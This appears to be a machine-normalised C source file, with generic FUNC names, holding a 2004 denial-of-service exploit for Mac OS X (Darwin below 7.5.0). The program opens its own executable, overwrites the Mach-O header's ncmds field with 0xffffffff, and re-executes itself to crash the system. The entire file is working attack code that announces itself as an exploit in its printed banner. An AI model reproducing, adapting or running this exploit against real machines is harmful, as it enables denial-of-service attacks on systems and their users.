#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int fpos_t ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int FUNC0 (char*,char**) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC3 (char*,char*) ; 
 int FUNC4 (int /*<<< orphan*/ *,int*) ; 
 int FUNC5 (int*,int,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 

int FUNC8( int ac, char * * av )
{
  FILE * me;
  int rpl = 0xffffffff;
  fpos_t pos = 0x10;
  FUNC6( "-( nacho - 2004 DoS for OSX (darwin < 7.5.0 )-\n" );
  FUNC6( "-( nemo pulltheplug org )-\n\n" );
  FUNC6( "[+] Opening file for writing.\n" );
  if ( !( me = FUNC3( * av, "r+" ) ) )
  {
    FUNC6( "[-] Error opening exe.\n" );
    FUNC1( 1 );
  }
  FUNC6( "[+] Seeking to ncmds.\n" );
  if ( ( FUNC4( me, & pos ) ) == -1 )
  {
    FUNC6( "[-] Error seeking to ncmds.\n" );
    FUNC1( 1 );
  }
  FUNC6( "[+] Changing ncmds to 0x%x.\n", rpl );
  if ( FUNC5( & rpl, 4, 1, me ) < 1 )
  {
    FUNC6( "[-] Error writing to file.\n" );
    FUNC1( 1 );
  }
  FUNC2( me );
  FUNC6( "[+] Re-executing with modified mach-o header.\n" );
  FUNC7( 5 );
  if ( FUNC0( * av, av ) == -1 )
  {
    FUNC6( "[-] Error executing %s, please run manually.\n", * av );
    FUNC1( 1 );
  }
  FUNC1( 0 ); // hrm
}